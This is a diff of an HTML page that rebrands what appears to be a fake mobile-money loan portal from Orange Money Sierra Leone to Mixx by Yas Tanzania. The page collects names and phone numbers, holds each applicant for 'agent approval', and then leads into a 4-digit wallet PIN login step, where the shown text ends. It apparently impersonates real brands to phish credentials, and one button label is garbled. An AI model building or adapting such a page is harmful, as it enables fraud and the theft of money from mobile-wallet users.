@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title data-i18n="title">Orange Money Loans Sierra Leone — Application Portal</title>
+  <title data-i18n="title">Mixx by Yas Tanzania — Portal ya Mikopo ya Kidijitali</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <script>
     tailwind.config = {
       theme: {
@@ -17,17 +17,18 @@
           },
           colors: {
             brand: {
-              orange: '#ff7900',
-              orangeDark: '#e06b00',
-              orangeDeep: '#cc5200',
-              orangeLight: '#fff5ec',
-              orangeBorder: '#ffb380',
-              black: '#0b0e14',
-              darkBg: '#121722',
-              darkCard: '#1a2130',
-              grayBg: '#f8fafc',
-              grayLight: '#e2e8f0',
-              grayMuted: '#64748b',
+              blueDark: '#0A192F',
+              blueDeep: '#002B66',
+              blue: '#0056C6',
+              blueRoyal: '#0284C7',
+              cyan: '#00C4FF',
+              yellow: '#FED100',
+              yellowHover: '#E5BC00',
+              yellowDark: '#D9AB00',
+              blueLight: '#F0F7FF',
+              blueBorder: '#BAE6FD',
+              black: '#070F1E',
+              grayBg: '#F8FAFC',
               grayText: '#334155'
             }
           }
@@ -55,16 +56,16 @@
       height: 24px;
       width: 24px;
       border-radius: 50%;
-      background: #ff7900;
-      border: 3px solid #ffffff;
-      box-shadow: 0 4px 10px rgba(255, 121, 0, 0.4);
+      background: #FED100;
+      border: 3px solid #0A192F;
+      box-shadow: 0 4px 12px rgba(254, 209, 0, 0.5);
       cursor: pointer;
       margin-top: -8px;
       transition: transform 0.15s ease, background-color 0.15s ease;
     }
     input[type=range]::-webkit-slider-thumb:hover {
       transform: scale(1.15);
-      background: #e06b00;
+      background: #E5BC00;
     }
     .pin-box {
       font-family: monospace;
@@ -73,45 +74,46 @@
       transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
     }
     .pin-box:focus, .pin-box.active {
-      border-color: #ff7900;
-      box-shadow: 0 0 0 4px rgba(255, 121, 0, 0.2);
+      border-color: #0056C6;
+      box-shadow: 0 0 0 4px rgba(0, 86, 198, 0.25);
       transform: translateY(-1px);
     }
-    .orange-gradient {
-      background: linear-gradient(135deg, #ff7900 0%, #ff5500 100%);
+    .mixx-gradient {
+      background: linear-gradient(135deg, #0A192F 0%, #002B66 45%, #0056C6 100%);
+    }
+    .mixx-btn-gradient {
+      background: linear-gradient(135deg, #FED100 0%, #F59E0B 100%);
+      color: #0A192F;
+    }
+    .mixx-blue-card {
+      background: linear-gradient(135deg, #0A192F 0%, #002B66 100%);
     }
   </style>
   <script src="/language.js" defer></script>
 </head>
-<body class="bg-slate-100 text-slate-800 font-sans min-h-screen flex flex-col antialiased selection:bg-brand-orange selection:text-white">
+<body class="bg-slate-100 text-slate-800 font-sans min-h-screen flex flex-col antialiased selection:bg-brand-blue selection:text-white">
 
   <!-- Main Container Mobile/Desktop Wrapper -->
   <div class="max-w-md w-full mx-auto bg-white min-h-screen shadow-2xl flex flex-col relative" style="overflow-x: clip;">
     
     <!-- Top Navigation Header -->
-    <header class="bg-brand-black text-white px-5 py-3.5 flex items-center justify-between sticky top-0 z-40 border-b border-slate-800 shadow-md">
+    <header class="bg-brand-blueDark text-white px-5 py-3.5 flex items-center justify-between sticky top-0 z-40 border-b-2 border-brand-yellow shadow-md">
       <div class="flex items-center space-x-3">
-        <button id="header-back-btn" onclick="handleBackAction()" class="p-1.5 -ml-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors opacity-0 pointer-events-none" aria-label="Back">
+        <button id="header-back-btn" onclick="handleBackAction()" class="p-1.5 -ml-1.5 rounded-lg text-blue-300 hover:text-white hover:bg-blue-900/60 transition-colors opacity-0 pointer-events-none" aria-label="Back">
           <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/>
           </svg>
         </button>
         <div class="flex items-center space-x-2.5">
-          <img src="/orange_money_logo.jpg" alt="Orange Money Logo" class="h-9 w-auto rounded-lg shadow-sm object-cover border border-slate-700/50" />
-          <div>
-            <h1 class="font-extrabold text-base tracking-tight text-white leading-none flex items-center gap-1.5">
-              Orange Money <span class="text-[10px] font-semibold bg-brand-orange text-white px-1.5 py-0.5 rounded tracking-wide uppercase">Sierra Leone 🇸🇱</span>
-            </h1>
-            <p id="logo-subtext" class="text-[11px] text-brand-orange font-medium mt-0.5 hidden">Sierra Leone Loans</p>
-          </div>
+          <img src="/mixx_by_yas_logo.svg" alt="Mixx by Yas" class="h-9 w-auto object-contain" />
         </div>
       </div>
 
       <div class="flex items-center space-x-2">
-        <button type="button" class="language-toggle bg-slate-800/80 hover:bg-slate-700 text-xs font-bold text-slate-200 px-2.5 py-1.5 rounded-md border border-slate-700 transition-all">
-          EN
+        <button type="button" class="language-toggle bg-blue-950/80 hover:bg-blue-900 text-xs font-black text-brand-yellow px-2.5 py-1.5 rounded-md border border-yellow-400/40 transition-all">
+          SW
         </button>
-        <button onclick="toggleNoticeModal(true, 'Customer Support', 'Orange Money Sierra Leone Helpline: 111 (Toll-Free) or +232 76 000 000.')" class="p-1.5 text-slate-400 hover:text-brand-orange rounded-lg transition-colors" aria-label="Info">
+        <button onclick="toggleNoticeModal(true, 'Customer Support', 'Mixx by Yas Tanzania Helpline: 100 (Toll-Free) au +255 754 000 000.')" class="p-1.5 text-blue-300 hover:text-brand-yellow rounded-lg transition-colors" aria-label="Info">
           <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
           </svg>
@@ -120,15 +122,15 @@
     </header>
 
     <!-- Agent Referral Active Badge (Dynamic) -->
-    <div id="referral-banner" class="bg-brand-orangeLight border-b border-brand-orangeBorder px-4 py-2 text-xs font-semibold text-brand-orangeDark flex items-center justify-between hidden">
+    <div id="referral-banner" class="bg-brand-blueLight border-b border-brand-blueBorder px-4 py-2 text-xs font-semibold text-brand-blue flex items-center justify-between hidden">
       <div class="flex items-center space-x-1.5">
         <span class="flex h-2 w-2 relative">
-          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span>
-          <span class="relative inline-flex rounded-full h-2 w-2 bg-brand-orange"></span>
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-2 w-2 bg-brand-blue"></span>
         </span>
-        <span>Recommended by Authorized Agent</span>
+        <span>Imependekezwa na Wakala wa Mixx Wakala</span>
       </div>
-      <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-brand-orangeBorder text-[11px]"></span>
+      <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-brand-blueBorder text-[11px] text-brand-blueDeep font-bold"></span>
     </div>
 
     <!-- Main Content Area -->
@@ -137,17 +139,17 @@
       <!-- STEP 0: Hero & Interactive Calculator -->
       <section id="step-0" class="flex-1 flex flex-col">
         <!-- Hero Header -->
-        <div class="orange-gradient text-white px-6 pt-7 pb-10 text-center relative overflow-hidden shadow-inner">
-          <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-white/10 rounded-full blur-xl pointer-events-none"></div>
+        <div class="mixx-gradient text-white px-6 pt-7 pb-10 text-center relative overflow-hidden shadow-inner">
+          <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-cyan-400/10 rounded-full blur-xl pointer-events-none"></div>
           <div class="relative z-10">
-            <div class="inline-flex items-center space-x-2 bg-black/20 backdrop-blur-md px-3 py-1 rounded-full text-xs font-semibold text-white mb-3">
-              <svg class="w-3.5 h-3.5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20">
+            <div class="inline-flex items-center space-x-2 bg-brand-yellow text-blue-950 px-3 py-1 rounded-full text-xs font-black shadow-sm mb-3">
+              <svg class="w-3.5 h-3.5 text-blue-950" fill="currentColor" viewBox="0 0 20 20">
                 <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
               </svg>
-              <span data-i18n="heroBadge">Instant Approval via Orange Money Sierra Leone</span>
+              <span data-i18n="heroBadge">Idhini ya Papo Hapo via Mixx by Yas Tanzania 🇹🇿</span>
             </div>
-            <h2 class="text-2xl font-extrabold tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulate Your Loan</h2>
-            <p class="text-xs text-orange-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Get funds directly into your Orange Money Sierra Leone account in minutes.</p>
+            <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulisha Mkopo Wako</h2>
+            <p class="text-xs text-blue-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Pata fedha moja kwa moja kwenye akaunti yako ya Mixx by Yas Tanzania kwa dakika chache.</p>
           </div>
         </div>
 
@@ -155,55 +157,55 @@
         <div class="-mt-6 bg-white rounded-t-2xl px-6 pt-6 pb-8 flex-1 flex flex-col justify-between shadow-lg">
           <div class="space-y-6">
             <!-- Amount Display & Slider -->
-            <div class="bg-slate-50 border border-slate-200/80 rounded-2xl p-5 shadow-sm">
+            <div class="bg-brand-blueLight/80 border border-brand-blueBorder/80 rounded-2xl p-5 shadow-sm">
               <div class="flex justify-between items-center mb-1">
-                <span class="text-xs font-bold text-slate-500 uppercase tracking-wider" data-i18n="requestedAmount">Requested Amount</span>
-                <span class="text-xs font-semibold text-brand-orange bg-brand-orangeLight px-2 py-0.5 rounded-md" data-i18n="interestRate">5% monthly rate</span>
+                <span class="text-xs font-bold text-brand-blueDeep uppercase tracking-wider" data-i18n="requestedAmount">Kiasi Unachoomba</span>
+                <span class="text-xs font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-md shadow-xs" data-i18n="interestRate">Riba 5% kwa mwezi</span>
               </div>
               <div class="text-center py-2">
-                <span id="calc-amount-display" class="text-3xl font-extrabold text-brand-black tracking-tight">SLE 10,000</span>
+                <span id="calc-amount-display" class="text-3xl font-black text-brand-blueDark tracking-tight">TZS 5,000,000</span>
               </div>
 
               <input 
                 id="amount-range" 
                 type="range" 
-                min="1000" 
-                max="150000" 
-                step="1000" 
-                value="10000" 
+                min="500000" 
+                max="100000000" 
+                step="500000" 
+                value="5000000" 
                 oninput="updateCalculator(this.value)" 
                 class="my-3"
               />
 
-              <div class="flex justify-between text-[11px] font-semibold text-slate-400">
-                <span>SLE 1,000</span>
-                <span>SLE 75,000</span>
-                <span>SLE 150,000</span>
+              <div class="flex justify-between text-[11px] font-bold text-slate-500">
+                <span>TZS 500,000</span>
+                <span>TZS 50,000,000</span>
+                <span>TZS 100,000,000</span>
               </div>
             </div>
 
             <!-- Term Selector Chips -->
             <div>
-              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Repayment Term</label>
+              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Muda wa Kurejesha</label>
               <div class="grid grid-cols-4 gap-2">
-                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-orange transition-all" data-i18n="month1">1 Month</button>
-                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-orange transition-all" data-i18n="months3">3 Months</button>
-                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-orange bg-brand-orangeLight text-brand-orangeDark shadow-sm" data-i18n="months6">6 Months</button>
-                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-orange transition-all" data-i18n="months12">12 Months</button>
+                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="month1">Mwezi 1</button>
+                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months3">Miezi 3</button>
+                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-blue bg-brand-blueLight text-brand-blueDeep shadow-sm" data-i18n="months6">Miezi 6</button>
+                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months12">Miezi 12</button>
               </div>
             </div>
 
             <!-- Repayment Summary Card -->
-            <div class="bg-brand-black text-white rounded-2xl p-5 shadow-xl relative overflow-hidden">
-              <div class="flex justify-between items-center border-b border-slate-800 pb-3 mb-3">
-                <span class="text-xs text-slate-400" data-i18n="estMonthly">Est. Monthly Payment:</span>
-                <span class="text-xl font-extrabold text-brand-orange tracking-tight">
-                  <span id="calc-monthly-payment">1,917</span> SLE/mo
+            <div class="mixx-blue-card text-white rounded-2xl p-5 shadow-xl relative overflow-hidden border border-blue-900">
+              <div class="flex justify-between items-center border-b border-blue-900/80 pb-3 mb-3">
+                <span class="text-xs text-blue-200" data-i18n="estMonthly">Marejesho kwa Mwezi:</span>
+                <span class="text-xl font-black text-brand-yellow tracking-tight">
+                  <span id="calc-monthly-payment">958,333</span> TZS/mo
                 </span>
               </div>
-              <div class="flex justify-between items-center text-xs text-slate-400">
-                <span data-i18n="totalRepay">Total Repayable:</span>
-                <span id="calc-total-payment" class="font-bold text-slate-200">SLE 11,500</span>
+              <div class="flex justify-between items-center text-xs text-blue-200">
+                <span data-i18n="totalRepay">Jumla ya Kurejesha:</span>
+                <span id="calc-total-payment" class="font-extrabold text-white">TZS 5,750,000</span>
               </div>
             </div>
           </div>
@@ -213,13 +215,13 @@
             <button 
               type="button" 
               onclick="goToStep(1)" 
-              class="w-full py-4 orange-gradient hover:opacity-95 active:scale-[0.99] text-white font-extrabold rounded-xl shadow-lg shadow-orange-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
-              <span data-i18n="applyNow">APPLY FOR LOAN NOW</span>
+              class="w-full py-4 mixx-btn-gradient hover:opacity-95 active:scale-[0.99] font-black rounded-xl shadow-lg shadow-yellow-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
+              <span data-i18n="applyNow">OMBA MKOPO SASA</span>
               <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
               </svg>
             </button>
-            <p class="text-[11px] text-slate-400 text-center mt-3">100% Digital Process & SSL Encrypted Security</p>
+            <p class="text-[11px] text-slate-400 text-center mt-3">Mchakato wa 100% wa Kidijitali na Ulinzi wa Mixx</p>
           </div>
         </div>
       </section>
@@ -227,42 +229,42 @@
       <!-- STEP 1: Loan Configuration Form -->
       <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
-          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 4</span>
-          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step1Title">Loan Details</h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Customize your loan terms.</p>
+          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 1 ya 4</span>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step1Title">Taarifa za Mkopo</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Chagua vigezo vya mkopo wako (Bustisha au Nivushe Plus).</p>
         </div>
 
         <div class="space-y-4">
           <div>
-            <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="loanType">Loan Type</label>
-            <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20">
-              <option value="Personal Loan">Personal Loan</option>
-              <option value="Business Loan">Business Loan</option>
-              <option value="Emergency Loan">Emergency Loan</option>
-              <option value="Salary Advance">Salary Advance</option>
+            <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="loanType">Aina ya Mkopo</label>
+            <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
+              <option value="Bustisha Micro-Loan">Bustisha Micro-Loan</option>
+              <option value="Nivushe Plus Loan" selected>Nivushe Plus Loan</option>
+              <option value="Biashara Micro-Credit">Biashara Micro-Credit</option>
+              <option value="Emergency Advance">Emergency Advance</option>
             </select>
           </div>
 
           <div>
-            <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="amountLabel">Amount (SLE)</label>
-            <input id="loan-amount-input" type="number" step="500" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20" value="10000" />
+            <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="amountLabel">Kiasi (TZS)</label>
+            <input id="loan-amount-input" type="number" min="500000" max="100000000" step="100000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20" value="5000000" />
           </div>
 
           <div>
-            <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="termLabel">Term (Months)</label>
-            <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20">
-              <option value="1">1 Month</option>
-              <option value="3">3 Months</option>
-              <option value="6" selected>6 Months</option>
-              <option value="12">12 Months</option>
-              <option value="24">24 Months</option>
-              <option value="36">36 Months</option>
+            <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="termLabel">Muda (Miezi)</label>
+            <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
+              <option value="1">Mwezi 1</option>
+              <option value="3">Miezi 3</option>
+              <option value="6" selected>Miezi 6</option>
+              <option value="12">Miezi 12</option>
+              <option value="24">Miezi 24</option>
+              <option value="36">Miezi 36</option>
             </select>
           </div>
 
           <div>
-            <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="purposeLabel">Loan Purpose</label>
-            <textarea id="loan-purpose-input" rows="3" placeholder="e.g. Business investment, medical expenses, personal purchases..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20 resize-none">Personal Investment</textarea>
+            <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="purposeLabel">Dhumuni la Mkopo</label>
+            <textarea id="loan-purpose-input" rows="3" placeholder="mf. Ukuzi wa Biashara, Gharama za Matibabu, Upatikanaji wa Mtaji..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Biashara na Mtaji</textarea>
           </div>
         </div>
 
@@ -270,9 +272,9 @@
           <button 
             type="button" 
             onclick="goToStep(2)" 
-            class="w-full py-4 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
+            class="w-full py-4 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase"
             data-i18n="continueToPersonal">
-            CONTINUE TO PERSONAL DETAILS
+            ENDELEA KWENYE TAARIFA BINAOrdered
           </button>
         </div>
       </section>
@@ -280,44 +282,44 @@
       <!-- STEP 2: Applicant Information Form -->
       <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-3 sm:space-y-4">
         <div>
-          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 4</span>
-          <h2 class="text-xl font-extrabold text-slate-900 mt-1.5" data-i18n="step2Title">Applicant Details</h2>
-          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Fill in your official identification information.</p>
+          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 2 ya 4</span>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-1.5" data-i18n="step2Title">Taarifa za Mwombaji</h2>
+          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Jaza taarifa zako rasmi za kitambulisho.</p>
         </div>
 
         <div class="space-y-3">
           <div class="grid grid-cols-2 gap-2.5">
             <div>
-              <label for="first-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="firstName">First Name *</label>
-              <input id="first-name-input" type="text" placeholder="e.g. Mohamed" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange" value="" required />
+              <label for="first-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="firstName">Jina la Kwanza *</label>
+              <input id="first-name-input" type="text" placeholder="mf. Juma" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
             <div>
-              <label for="last-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="lastName">Last Name *</label>
-              <input id="last-name-input" type="text" placeholder="e.g. Kamara" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange" value="" required />
+              <label for="last-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="lastName">Jina la Ukoo *</label>
+              <input id="last-name-input" type="text" placeholder="mf. Hassan" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
           </div>
 
           <div>
-            <label for="phone-number-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="orangePhone">Orange Money Phone (+232) *</label>
+            <label for="phone-number-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="orangePhone">Nambari ya Simu ya Mixx (+255) *</label>
             <div class="flex items-center">
-              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+232</span>
-              <input id="phone-number-input" type="tel" placeholder="76 123 456" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-orange" value="" required />
+              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+255</span>
+              <input id="phone-number-input" type="tel" placeholder="754 123 456" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
           </div>
 
           <div>
-            <label for="employment-select" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="employmentStatus">Employment Status</label>
-            <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange">
-              <option value="Employed">Employed</option>
-              <option value="Self-Employed / Business Owner" selected>Self-Employed / Business Owner</option>
-              <option value="Freelancer">Freelancer</option>
-              <option value="Other">Other</option>
+            <label for="employment-select" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1" data-i18n="employmentStatus">Hali ya Ajira</label>
+            <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue">
+              <option value="Employed">Ameajiriwa</option>
+              <option value="Self-Employed / Business Owner" selected>Kujiajiri / Mfanyabiashara</option>
+              <option value="Freelancer">Kazi Huru (Freelancer)</option>
+              <option value="Other">Nyingine</option>
             </select>
           </div>
 
           <div class="flex items-center space-x-2 pt-1">
-            <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-brand-orange rounded border-slate-300 focus:ring-brand-orange" />
-            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">I authorize the referral agent to track application status.</label>
+            <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-brand-blue rounded border-slate-300 focus:ring-brand-blue" />
+            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">Namruhusu wakala wa Mixx Wakala kufuatilia hali ya ombi langu.</label>
           </div>
 
           <div id="step2-alert" class="mt-2 p-2.5 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
@@ -328,21 +330,21 @@
             id="continue-to-auth-btn"
             type="button" 
             onclick="submitStep2AndAwaitApproval()" 
-            class="w-full py-3.5 sm:py-4 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase transition-all"
+            class="w-full py-3.5 sm:py-4 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all"
             data-i18n="continueToAuth">
-            CONTINUE TO ORANGE AUTHENTICATION
+            ENDELEA KWENYE UHAKIKI WA MIXX
           </button>
         </div>
 
         <!-- Live Approval Waiting Indicator for Step 2 Application Submission -->
-        <div id="app-waiting-box" class="hidden p-3.5 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+        <div id="app-waiting-box" class="hidden p-3.5 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
           <div class="flex items-center justify-center space-x-2">
-            <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
-            <span class="text-xs font-bold text-amber-900 uppercase tracking-wider">Awaiting Application Approval</span>
+            <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
+            <span class="text-xs font-bold text-blue-900 uppercase tracking-wider">Inasubiri Idhini ya Ombi</span>
           </div>
-          <p class="text-xs text-amber-800">Your application details have been submitted. Please wait while your referral agent approves your request to proceed...</p>
+          <p class="text-xs text-blue-800">Taarifa za ombi lako zimetumwa. Tafadhali subiri wakati wakala wako anaidhinisha ombi lako...</p>
           <div class="flex justify-center pt-1">
-            <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
+            <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
               <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
               <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
@@ -350,39 +352,39 @@
         </div>
       </section>
 
-      <!-- STEP 3: Orange Money Login & Verification (4-DIGIT PIN FOR SIERRA LEONE) -->
+      <!-- STEP 3: Mixx by Yas Login & Verification (4-DIGIT PIN) -->
       <section id="step-3" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-3.5 sm:space-y-4">
         <div>
-          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 3 of 4</span>
